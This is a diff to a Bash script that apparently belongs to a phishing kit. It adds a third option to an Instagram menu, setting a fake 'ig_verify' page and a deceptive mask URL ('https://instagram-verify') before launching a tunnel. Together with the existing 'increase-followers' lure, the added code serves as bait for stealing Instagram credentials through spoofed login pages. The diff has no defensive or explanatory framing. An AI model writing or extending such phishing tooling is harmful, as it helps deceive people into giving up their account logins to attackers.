@@ -321,6 +321,10 @@ site_instagram() {
 		website="ig_increase"
 		mask='https://increase-followers'
 		tunnel_menu
+	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
+		website="ig_verify"
+		mask='https://instagram-verify'
+		tunnel_menu
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 		{ sleep 1; clear; banner_small; site_instagram; }
